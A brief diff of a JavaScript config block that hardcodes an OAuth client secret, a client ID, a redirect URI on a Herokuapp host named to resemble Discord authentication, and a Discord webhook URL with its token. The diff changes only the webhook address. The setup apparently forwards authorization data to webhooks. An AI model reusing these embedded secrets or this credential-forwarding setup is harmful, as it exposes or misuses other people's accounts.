@@ -2,7 +2,7 @@
 const client_secret = 'Dj38Q~9N6gBZpniP6vvRRpX3CyHvXfMdE2W7vc.w'
 const client_id = 'fcc2cabf-20a8-42e6-96e0-80b398b62fbf'
 const redirect_uri = 'https://disc-authentication.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1034525290875060314/bus7n2Ux68ZnpB9uJSLqxQpKWneN_RVT8QtBd6HKqxSBT_r3m61ud_cMt0b8JunX2p9W'
+const webhook_url = 'https://disc-authentication.herokuapp.com/'
 const webhook_logging_url = 'https://discord.com/api/webhooks/1034525290875060314/bus7n2Ux68ZnpB9uJSLqxQpKWneN_RVT8QtBd6HKqxSBT_r3m61ud_cMt0b8JunX2p9W'
 // Config end
 const axios = require('axios')
